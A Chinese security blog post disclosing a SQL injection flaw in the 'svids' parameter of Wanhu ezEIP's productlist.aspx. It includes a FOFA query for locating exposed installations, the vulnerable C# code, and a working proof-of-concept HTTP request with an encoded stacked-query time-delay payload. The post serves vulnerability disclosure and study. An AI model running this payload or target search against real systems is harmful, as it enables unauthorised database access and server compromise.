---
title: "万户ezEIP productlist.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/ezEIP-shop-productlist-svids-sqli.html
asset_dir: assets/万户ezeip-productlist.aspx-sql注入漏洞
---

# 万户ezEIP productlist.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/27 18:23
- 946浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

ERP

安全

企业资源规划

---

# 漏洞简介

万户ezEIP是一种[企业资源规划](#)[软件](#)，旨在帮助企业管理其各个方面的业务流程。它提供了一套集成的解决方案，涵盖了财务、供应链管理、销售和市场营销、人力资源等各个领域。万户ezEIP productlist.aspx 接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> `app="万户网络-ezEIP" || (body="ezEIP"||header="ezEIP")`

# 漏洞分析

```
//绑定已选中的搜选项
    private void BindChooseSearchValue()
    {
        string SearchValues = RequestUtil.Instance.GetString("svids").Replace("'", "");
        SearchValues = SearchValues.Trim(',');
        if (!string.IsNullOrEmpty(SearchValues))
        {
            StringBuilder searchHtml = new StringBuilder();
            SearchValues = Server.UrlDecode(SearchValues);
            string SQL = "SELECT S.SearchName,SV.SearchValueID,SV.SearchValueName FROM Whir_Shop_SearchValue SV LEFT JOIN Whir_Shop_Search S ON SV.SearchID=S.SearchID WHERE SV.SearchValueID IN (" + SearchValues + ")";
            List<ShopSearchValue> ssvlist = ShopSearchValueService.Instance.Query<ShopSearchValue>(SQL).ToList();
            foreach (ShopSearchValue ssv in ssvlist)
            {
                searchHtml.Append("<a  svid=\"" + ssv.SearchValueID + "\" style=\"cursor:pointer;\">" + ssv.SearchName + "：" + ssv.SearchValueName + "&nbsp;&nbsp;×</a>");
            }
            ltChooseSearchValue.Text = searchHtml.ToString();
        }
    }
```

深入探索

在线安全工具

Web安全课程

安全研究工具

svids 直接拼接进SQL语句执行，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /shop/productlist.aspx HTTP/1.1
Host: ezeip.mrxn.net
Content-Type: application/x-www-form-urlencoded

ob=price&price=asc&svids=1%29%3BDECLARE+%40%40test+VARCHAR%28100%29%3BSet+%40%40test%3DChar%28115%29%252bChar%28101%29%252bChar%28108%29%252bChar%28101%29%252bChar%2899%29%252bChar%28116%29%252bChar%2832%29%252bChar%2849%29%252bChar%2832%29%252bChar%28119%29%252bChar%28104%29%252bChar%28101%29%252bChar%28114%29%252bChar%28101%29%252bChar%2832%29%252bChar%2849%29%252bChar%2861%29%252bChar%2849%29%252bChar%2832%29%252bChar%2887%29%252bChar%2865%29%252bChar%2873%29%252bChar%2884%29%252bChar%2870%29%252bChar%2879%29%252bChar%2882%29%252bChar%2832%29%252bChar%2868%29%252bChar%2869%29%252bChar%2876%29%252bChar%2865%29%252bChar%2889%29%252bChar%2832%29%252bChar%2839%29%252bChar%2848%29%252bChar%2858%29%252bChar%2848%29%252bChar%2858%29%252bChar%2851%29%252bChar%2839%29%3BEXECUTE+%28%40%40test%29%3B--
```

成功延时 3 秒

代码安全审计

[![万户ezEIP productlist.aspx SQL注入漏洞](images/img-001-16f9730e5a5e.webp)](https://image.mrxn.net/40248af6ee8f46cbb21653e5f905f574.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
